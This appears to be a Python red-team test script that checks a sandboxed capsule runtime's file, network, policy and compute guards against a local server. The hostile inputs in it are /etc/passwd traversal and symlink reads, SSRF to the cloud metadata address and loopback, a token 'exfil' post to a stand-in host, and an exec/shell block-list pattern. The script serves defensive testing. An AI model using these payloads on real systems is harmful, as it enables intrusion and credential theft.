#!/usr/bin/env python3
"""Containment matrix demo: red-team eval against a capsule doing exactly
what a compromised agent would do.

One inline 'hostile proxy' capsule dispatches attacker-chosen arguments into
every IO capability the runtime exposes. We then run a 13-vector attack matrix
(file sandbox, network sandbox, policy flips, resource limits, attack-surface
inventory) against the live server and print the actual denial strings.

Statuses:
  PASS - a real guard fired, denial string observed in the response
  GAP  - documented limitation found in code (not faked, not counted as pass)
  FAIL - a guard that should have fired did not (exits 1)
"""
import hashlib
import json
import os
import random
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LYCAN = os.path.join(ROOT, "target", "release", "lycan")

TENANT, JOB, CAPSULE = "redteam", "eval", "proxy"
KEY = "containment-key"
PORT = 0
PASS = 0
FAIL = 0
GAP = 0
TOTAL = 0
ROWS = []  # (id, title, status, evidence)


def record(rid, title, status, evidence):
    global PASS, FAIL, GAP, TOTAL
    if status in ("PASS", "FAIL", "GAP"):
        TOTAL += 1
    if status == "PASS":
        PASS += 1
    elif status == "FAIL":
        FAIL += 1
    elif status == "GAP":
        GAP += 1
    ROWS.append((rid, title, status, evidence))
    print(f"  [{rid}] {status:4} | {title}")
    if evidence:
        print(f"         evidence: {one_line(evidence, 110)}")


def one_line(s, width=110):
    s = re.sub(r"\s+", " ", str(s)).strip()
    return s if len(s) <= width else s[: width - 3] + "..."


def http(method, path, body=None, raw=False, timeout=60):
    url = f"http://127.0.0.1:{PORT}{path}"
    data = body if isinstance(body, (bytes, type(None))) else json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", f"Bearer {KEY}")
    if not raw and data is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001 - transport errors are evidence too
        return 0, str(e)


def decide(mode, arg="", body=""):
    payload = {"contextKey": "matrix", "input": {"mode": mode, "arg": arg, "body": body}}
    t0 = time.monotonic()
    st, txt = http("POST", f"/tenants/{TENANT}/jobs/{JOB}/capsules/{CAPSULE}/decide", payload)
    return st, txt, (time.monotonic() - t0) * 1000.0


def denial_text(txt):
    try:
        return json.loads(txt).get("error", txt)
    except (ValueError, AttributeError):
        return txt


def policy_doc(**over):
    # file_root is relative to the capsule's data/ directory ("." = data/
    # itself); absolute or escaping roots are refused at PUT time.
    pol = {
        "allow_stdout": True, "allow_stdin": False,
        "allow_file_read": True, "allow_file_write": True, "allow_network": True,
        "file_root": ".", "allowed_hosts": ["example.invalid"],
        "deny_private_networks": True, "max_execution_ms": 30000,
        "max_memory_bytes": 268435456,
    }
    pol.update(over)
    return pol


def put_policy(**over):
    st, txt = http("PUT", f"/tenants/{TENANT}/jobs/{JOB}/capsules/{CAPSULE}/policy",
                   policy_doc(**over))
    assert st == 200, f"policy PUT failed ({st}): {txt}"


# ── hostile proxy capsule: dispatches attacker-controlled args into caps ──
# The 300-node pad chain runs AFTER the dispatch binding so that the
# executor's max_execution_ms checkpoint (every 64 node evals) is crossed
# after the heavy sql scan completes — otherwise a short graph could finish
# between checkpoints and the budget breach would go undetected.
HOSTILE_SRC = r"""
($ mode (!cap "runtime.inputGet" "mode"))
($ arg (!cap "runtime.inputGet" "arg"))
($ body (!cap "runtime.inputGet" "body"))
($ dispatch
 (? (== mode "read") (!p (!cap "file.readText" arg))
  (? (== mode "write") (!p (!cap "file.writeText" arg body))
   (? (== mode "exists") (!p (!cap "file.exists" arg))
    (? (== mode "get") (!p (!cap "http.get" arg))
     (? (== mode "post") (!p (!cap "http.post" arg body "text/plain"))
      (? (== mode "sql") (!p (!cap "sql.sqliteQuery" arg body))
       (? (== mode "exec") (!p (!cap "process.exec" arg))
        (? (== mode "env") (!p (!cap "runtime.env" arg))
         (!p "mode not recognized"))))))))))
($ pad0 0)
""" + "".join(f"($ pad{i} (+ pad{i - 1} 1))\n" for i in range(1, 301)) + "dispatch\n"

CONTAINMENT_SUBSTRINGS = ["denied", "escapes sandbox", "not in allowed_hosts",
                          "unknown capability"]


def main():
    global PORT, DATA1

    # ── setup ──
    if not os.path.exists(LYCAN):
        print("lycan binary missing — building release...")
        subprocess.run(["cargo", "build", "--release", "--quiet"], cwd=ROOT, check=True)

    base = tempfile.mkdtemp(prefix="lycan-containment.")
    store = os.path.join(base, "store")
    keep = os.environ.get("KEEP_DEMO_OUTPUT") == "1"
    proc = None

    def cleanup():
        if proc is not None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
        if not keep:
            shutil.rmtree(base, ignore_errors=True)
        else:
            print(f"(output kept in {base})")

    import atexit
    atexit.register(cleanup)

    rng = random.Random()
    port_base = int(os.environ.get("PORTBASE", "12100"))
    for _ in range(20):
        cand = port_base + rng.randint(0, 499)
        with socket.socket() as s:
            try:
                s.bind(("127.0.0.1", cand))
                PORT = cand
                break
            except OSError:
                continue
    if not PORT:
        print("no free port found")
        return 1

    srcl = os.path.join(base, "hostile-proxy.lycs")
    with open(srcl, "w") as f:
        f.write(HOSTILE_SRC)
    r = subprocess.run([LYCAN, "compile", srcl], capture_output=True, text=True)
    if r.returncode != 0:
        print("hostile capsule failed to compile:", r.stderr)
        return 1
    with open(srcl[:-1], "rb") as f:  # .lyc
        capsule_bytes = f.read()
    print(f"  compiled hostile proxy capsule: {len(capsule_bytes)} bytes")

    proc = subprocess.Popen([LYCAN, "serve", "--addr", f"127.0.0.1:{PORT}",
                             "--store", store, "--admin-key", KEY],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ready = False
    for _ in range(100):
        st, _ = http("GET", "/health", None, raw=True, timeout=2)
        if st == 200:
            ready = True
            break
        time.sleep(0.1)
    if not ready:
        print("server did not come up within 10s")
        return 1

    st, _ = http("POST", f"/tenants/{TENANT}/jobs", {"id": JOB})
    assert st in (200, 409)
    st, txt = http("POST", f"/tenants/{TENANT}/jobs/{JOB}/capsules/{CAPSULE}/install",
                   capsule_bytes, raw=True)
    assert st == 200, f"install failed ({st}): {txt}"
    print(f"  server pid {proc.pid} on 127.0.0.1:{PORT}, store {store}")

    capdir = os.path.join(store, "tenants", TENANT, "jobs", JOB, "capsules", CAPSULE)
    DATA1 = os.path.join(capdir, "data")
    DATA2 = os.path.join(DATA1, "sub2")
    os.makedirs(DATA1, exist_ok=True)
    os.makedirs(DATA2, exist_ok=True)
    with open(os.path.join(DATA1, "secret.txt"), "w") as f:
        f.write("CANARY-DO-NOT-LEAK")
    put_policy()

    print()
    print("=" * 78)
    print("SYNTA / LYCAN CONTAINMENT MATRIX")
    print("A capsule doing what a compromised agent does — 14 attack vectors")
    print("=" * 78)
    print(f"policy: file read+write ON, network ON, file_root=<capsule>/data,")
    print(f"        allowed_hosts=['example.invalid'], deny_private_networks=true")
    print()

    # ── controls: prove the runtime works and denials are specific ──
    print("Controls (the capability itself must work — denials are not blanket):")
    st, txt, _ = decide("read", "secret.txt")
    ok = st == 200 and "CANARY-DO-NOT-LEAK" in txt
    record("C1", "readText relative path inside file_root succeeds",
           "PASS" if ok else "FAIL", txt)
    st, txt, _ = decide("write", "out.txt", "written-by-capsule")
    landed = os.path.exists(os.path.join(DATA1, "out.txt"))
    ok = st == 200 and landed
    record("C2", "writeText inside file_root succeeds (file on disk)",
           "PASS" if ok else "FAIL", f"status={st} file_on_disk={landed}")
    st, txt, _ = decide("exists", "secret.txt")
    record("C3", "file.exists relative succeeds",
           "PASS" if st == 200 else "FAIL", txt)
    print()

    # ── the matrix ──
    print("Attack matrix — each row sends decide and prints the observed response:")

    def attack(rid, title, mode, arg, body, expect):
        st, txt, ms = decide(mode, arg, body)
        err = denial_text(txt)
        fired = st == 500 and expect in err
        status = "PASS" if fired else "FAIL"
        ev = f"{ms:.0f}ms http={st} err: {err}"
        record(rid, title, status, ev)

    attack("R1", "readText /etc/passwd (absolute path)", "read", "/etc/passwd", "",
           "absolute paths denied")
    attack("R2", "readText ../../../../etc/passwd (traversal)", "read",
           "../../../../etc/passwd", "", "traversal denied")

    # R3: second policy round — re-root file_root to data/sub2, try an
    # absolute path into the OLD root. sandbox.rs rejects absolute paths
    # before touching root.
    put_policy(file_root="sub2")
    attack("R3", "readText abs path into OLD file_root after re-root policy",
           "read", os.path.join(DATA1, "secret.txt"), "", "absolute paths denied")
    put_policy()

    # R3b: the policy itself cannot widen the sandbox. An absolute file_root
    # (here: the capsule directory, which holds policy.json and the logs)
    # is refused at PUT time.
    st, txt = http("PUT", f"/tenants/{TENANT}/jobs/{JOB}/capsules/{CAPSULE}/policy",
                   policy_doc(file_root=capdir))
    record("R3b", "policy PUT with an absolute file_root is refused",
           "PASS" if st == 400 else "FAIL", f"http={st} {one_line(denial_text(txt), 90)}")

    attack("R4", "writeText ../..-escape (outside file_root)", "write",
           "../../../tmp/syntra-pwn-" + str(PORT) + ".txt", "pwned", "traversal denied")
    if os.path.exists("/tmp/syntra-pwn-%d.txt" % PORT):
        record("R4b", "post-check: escape file must NOT exist", "FAIL", "/tmp file found")
    else:
        record("R4b", "post-check: escape file was not created on disk", "PASS", "")

    # R5: symlink planted INSIDE file_root pointing at /etc/passwd.
    # sandbox.rs canonicalizes read targets and asserts they stay under root.
    link = os.path.join(DATA1, "escape_link")
    if not os.path.lexists(link):
        os.symlink("/etc/passwd", link)
    st, txt, ms = decide("read", "escape_link")
    if st == 200:
        record("R5", "readText follows symlink out of file_root", "GAP",
               "SYMLINK FOLLOWED (in-process sandbox): read succeeded, body="
               + one_line(txt, 80))
    elif "path escapes sandbox" in denial_text(txt):
        record("R5", "readText via symlink planted inside file_root", "PASS",
               f"{ms:.0f}ms http={st} err: {denial_text(txt)}")
    else:
        record("R5", "readText via symlink inside file_root", "FAIL",
               f"unexpected http={st} resp={txt}")

    attack("R6", "http.get cloud metadata 169.254.169.254", "get",
           "https://169.254.169.254/latest/meta-data/", "", "not in allowed_hosts")
    put_policy(allowed_hosts=["example.invalid", "169.254.169.254"])
    attack("R6b", "same URL after allowlisting 169.254.169.254 — private-IP guard",
           "get", "https://169.254.169.254/latest/meta-data/", "",
           "private network denied")
    put_policy()

    attack("R7", "http.get SSRF at own admin console 127.0.0.1:"
           + str(PORT) + "/admin", "get", f"https://127.0.0.1:{PORT}/admin", "",
           "not in allowed_hosts")
    put_policy(allowed_hosts=["example.invalid", "127.0.0.1"])
    attack("R7b", "127.0.0.1 ALLOWED in hosts list — deny_private_networks still fires",
           "get", f"https://127.0.0.1:{PORT}/admin", "", "private network denied")
    put_policy(allowed_hosts=["example.invalid", "localhost"])
    attack("R7c", "localhost ALLOWED in hosts list — private/local host guard fires",
           "get", f"https://localhost:{PORT}/admin", "", "private/local host denied")
    put_policy()

    attack("R8", "http.get RFC1918 10.0.0.7", "get", "https://10.0.0.7/", "",
           "not in allowed_hosts")
    put_policy(allowed_hosts=["example.invalid", "10.0.0.7"])
    attack("R8b", "10.0.0.7 ALLOWED in hosts list — private-IP guard fires", "get",
           "https://10.0.0.7/", "", "private network denied")
    put_policy()

    attack("R9", "http.post exfil to https://exfil.example.net/ (not allowlisted)",
           "post", "https://exfil.example.net/", "SESSION_TOKEN=deadbeef",
           "not in allowed_hosts")

    # R10: the sandbox is https-only unless the policy opts in with
    # allow_insecure_http, so an allowlisted host cannot be reached in the clear.
    attack("R10", "plain http:// to an allowlisted host (https-only by default)",
           "get", "http://example.invalid/", "", "plain http:// is denied")

    # R11: flip policy off via PUT, retry a previously-allowed call
    put_policy(allow_file_read=False)
    attack("R11a", "allow_file_read flipped OFF, retry benign in-root read", "read",
           "secret.txt", "", "effect=file_read denied by policy")
    put_policy(allow_network=False)
    attack("R11b", "allow_network flipped OFF, retry http.get", "get",
           "https://10.0.0.7/", "", "effect=network denied by policy")
    put_policy()

    # R12: compute budget. .lyc graphs are verifier-checked acyclic and the
    # language has no loop syntax, so 'runnable forever' is impossible; the
    # long pole is one heavy kernel call. The executor now enforces
    # max_execution_ms (checked every 64 node evals) and audits the breach.
    db = os.path.join(DATA1, "bench.sqlite")
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE big(x INTEGER, payload TEXT)")
    con.executemany("INSERT INTO big VALUES (?,?)",
                    ((i, f"row-{i}-payload") for i in range(2_000_000)))
    con.commit()
    con.close()
    heavy_sql = " UNION ALL ".join(
        ["SELECT COUNT(*) AS c FROM big WHERE payload LIKE '%999777111%'"] * 20)
    budget = 50
    put_policy(max_execution_ms=budget)
    st, txt, ms = decide("sql", "bench.sqlite", heavy_sql)
    err = denial_text(txt)
    fired = st == 500 and "max_execution_ms" in err
    status = "PASS" if fired else "FAIL"
    record("R12", f"heavy sql scan aborted by max_execution_ms={budget} budget",
           status,
           f"{ms:.0f}ms http={st} err: {err}" if fired else
           f"budget NOT enforced: http={st} after {ms:.0f}ms: {err}")
    put_policy()

    # R13: env/process surface. Inventory the compiled capability registry —
    # if no exec/env surface exists, the classic agent-hijack pivot is simply
    # not reachable. Fails closed at runtime (unknown capability) if called.
    caps = subprocess.run([LYCAN, "capabilities"], capture_output=True, text=True)
    names = [c["name"] for c in json.loads(caps.stdout)]
    import io
    pat = re.compile(r"env|exec|spawn|fork|shell|syscall|popen|process|subprocess|"
                     r"command|ptrace|mmap", re.IGNORECASE)
    hits = [n for n in names if pat.search(n)]
    st, txt, ms = decide("exec", "id")
    err = denial_text(txt)
    surface_clean = not hits and "unknown capability" in err
    record("R13", "env/process/exec capability surface",
           "PASS" if surface_clean else "FAIL",
           f"registry has {len(names)} capabilities, {len(hits)} env/exec-ish "
           f"{'(' + ','.join(hits) + ')' if hits else ''}; live "
           f"(mode=exec->!cap process.exec): http={st} err: {err}")
    st, txt, _ = decide("env", "PATH")
    print(f"         also: runtime.env -> http={st} err: {one_line(denial_text(txt), 90)}")
    print()

    # ── audit trail ──
    print("Audit trail (GET /audits — raw JSONL):")
    st, audits = http("GET", f"/tenants/{TENANT}/jobs/{JOB}/capsules/{CAPSULE}/audits")
    assert st == 200, f"audits fetch failed: {st}"
    lines = [l for l in audits.splitlines() if l.strip()]
    denial_lines = []
    for l in lines:
        try:
            ev = json.loads(l)
        except ValueError:
            continue
        if ev.get("action") == "execution_denied" or any(
                s in l for s in CONTAINMENT_SUBSTRINGS):
            denial_lines.append(l)
    print(f"  audit events total: {len(lines)}; containment-marked events: "
          f"{len(denial_lines)}")
    for l in denial_lines[:2]:
        print(f"  sample: {one_line(l, 140)}")
    # The matrix issues ~18 denials; every executor error must land in the
    # trail as an execution_denied event BEFORE the 500.
    if len(denial_lines) >= 15:
        record("A1", "every capability denial is written to the audit trail",
               "PASS",
               f"{len(denial_lines)} execution_denied events audited; sample: "
               + one_line(denial_lines[0], 80))
    else:
        record("A1", "every capability denial is written to the audit trail",
               "FAIL",
               f"expected >=15 execution_denied events, found "
               f"{len(denial_lines)} of {len(lines)} total audit events")
    # ── honest scope ──
    print("=" * 78)
    print("SCOPE & HONESTY")
    print("=" * 78)
    print("""* In-process reference monitor. Capsules run inside the server process
  behind a policy-checked capability dispatcher. NO syscall/OS/kernel
  isolation, no seccomp, no sandboxd, no memory isolation is claimed or
  provided. A compiled .lyc is data interpreted by the executor; hostile
  graph authors get no local variables, no loops (graphs are verifier-
  checked acyclic) and no direct syscall access, but they run in the same
  address space as the server.
* Enforced guards OBSERVED in this run (only if marked PASS above):
  file: absolute-path reject, '..' reject, canonicalized containment for
  reads and writes (symlink-escape defeat), per-effect policy gates
  (file_read/file_write/network) checked before every capability call.
  network: https-only unless allow_insecure_http, exact-host allowlist
  (empty list = deny all), private/loopback/RFC1918/CGNAT/link-local/
  metadata IP deny (incl. IPv4-mapped IPv6), both checked inside the HTTP
  client's resolver on the host it actually connects to (no DNS-rebinding
  window), redirects disabled under sandbox, 10s socket timeout, 1 MiB
  body caps. Only the operator admin key may set deny_private_networks=false.
  compute: max_execution_ms enforced by the graph executor (granularity:
  every 64 node evals — a single long kernel call is only caught at the
  next checkpoint; policy.json defaults the budget to 30000 ms when the
  field is absent).
  audit: every executor error is appended to /audits as execution_denied
  (with the error string and graphHash) BEFORE the HTTP 500 is returned.
  surface: exec/env/process capabilities are not compiled into the runtime.
* Documented gaps (not counted as passes):
  max_memory_bytes is parsed but NOT enforced anywhere (no memory cap),
  and (if observed) R5 symlink read behavior.""")
    if GAP:
        print(f"NOTE: {GAP} vector(s) ended as KNOWN GAP — the containment claim\n"
              f"      is reduced accordingly. They do not fail the run.\n")

    # ── receipt + score ──
    digest = hashlib.sha256(audits.encode()).hexdigest()
    print(f"RECEIPT sha256(audits) = {digest}")
    print()
    print(f"SCORE: {PASS}/{TOTAL} checks passed", end="")
    if GAP:
        print(f"  ({GAP} documented gap(s), see GAP rows above)")
    else:
        print()
    print("=" * 78)
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
